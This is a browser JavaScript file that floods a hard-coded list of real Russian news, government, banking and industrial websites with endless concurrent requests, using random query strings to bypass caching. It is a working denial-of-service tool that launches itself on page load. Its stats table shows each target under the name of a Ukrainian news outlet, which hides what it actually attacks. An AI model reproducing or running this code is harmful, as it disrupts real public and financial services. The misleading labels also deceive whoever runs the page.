var statsEl = document.getElementById('stats');

var CONCURRENCY_LIMIT = 1000;
var queue = [];

var targets = {
  'https://lenta.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Obozrevatel.com' },
  'https://ria.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Segodnya.ua' },
  'https://ria.ru/lenta/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Tsn.ua' },
  'https://www.rbc.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: '24tv.ua' },
  'https://www.rt.com/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Rbc.ua' },
  'http://kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Unian.net' },
  'http://en.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Nv.ua' },
  'https://smotrim.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Ictv.ua' },
  'https://tass.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Strana.ua' },
  'https://tvzvezda.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Gordonua.com' },
  'https://vsoloviev.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Pravda.com.ua' },
  'https://www.1tv.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Znaj.ua' },
  'https://www.vesti.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: '112.ua' },
  'https://online.sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Korrespondent.net' },
  'https://sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Apostrophe.ua' },
  'https://zakupki.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Gazeta.ua' },
  'https://www.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Censor.net' },
  'https://er.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Telegraf.com.ua' },
  'https://www.rzd.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Newsone.ua' },
  'https://rzdlog.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Liga.net' },
  'https://vgtrk.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Glavcom.ua' },
  'https://www.interfax.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'zik.ua' },
  'https://www.mos.ru/uslugi/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Facenews.ua' },
  'http://government.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Unn.com.ua' },
  'https://mil.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Politeka.net' },
  'https://www.nalog.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Expres.ua' },
  'https://customs.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Hronika.info' },
  'https://pfr.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Bagnet.org' },
  'https://rkn.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Ukrinform.ua' },
  'https://www.gazprombank.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Radiosvoboda.org' },
  'https://www.vtb.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Slovoidilo.ua' },
  'https://magnit.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Kp.ua' },
  'https://www.surgutneftegas.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Focus.ua' },
  'https://www.tatneft.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Fakty.ua' },
  'https://www.evraz.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Zaxid.net' },
  'https://www.sibur.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Podrobnosti.ua' },
  'https://www.severstal.com/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Comments.ua' },
  'https://www.metalloinvest.com/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Vesti-ukr.com' },
  'https://nangs.org/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Bykvu.com' },
  'https://rmk-group.ru/ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'From-ua.com' },
  'https://www.tmk-group.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Hvylya.net' },
  'https://ya.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Zn.ua' },
  'https://www.polymetalinternational.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Ukranews.com' },
  'https://www.uralkali.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Hromadske.ua' },
  'https://www.eurosib.ru/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Interfax.com.ua' },
  'https://ugmk.ua/': { number_of_requests: 0, number_of_errored_responses: 0, label: 'Enovosty.com' },
};

function printStats() {
  statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>???????????????????? ????????????????</th><th>???????????????????? ????????????</th></tr></thead><tbody>' + Object.entries(targets)
    .map(([target, { number_of_requests, number_of_errored_responses, label }]) => '<tr><td>' + label + '</td><td>' + number_of_requests + '</td><td>' +
      number_of_errored_responses + '</td></tr>')
    .join('') + '</tbody></table>';
}

setInterval(printStats, 1000);

async function fetchWithTimeout(resource, options) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), options.timeout);
  return fetch(resource, {
    method: 'GET',
    mode: 'no-cors',
    signal: controller.signal,
  }).then((response) => {
    clearTimeout(id);
    return response;
  }).catch((error) => {
    clearTimeout(id);
    throw error;
  });
}

async function flood(target) {
  for (var i = 0;; ++i) {
    if (queue.length > CONCURRENCY_LIMIT) {
      await queue.shift()
    }
    rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
    queue.push(
      fetchWithTimeout(target+rand, { timeout: 1000 })
        .catch((error) => {
          if (error.code === 20 /* ABORT */) {
            return;
          }
          targets[target].number_of_errored_responses++;
        })
        .then((response) => {
          if (response && !response.ok) {
            targets[target].number_of_errored_responses++;
          }
          targets[target].number_of_requests++;
        })

    )
  }
}

// Start
Object.keys(targets).map(flood);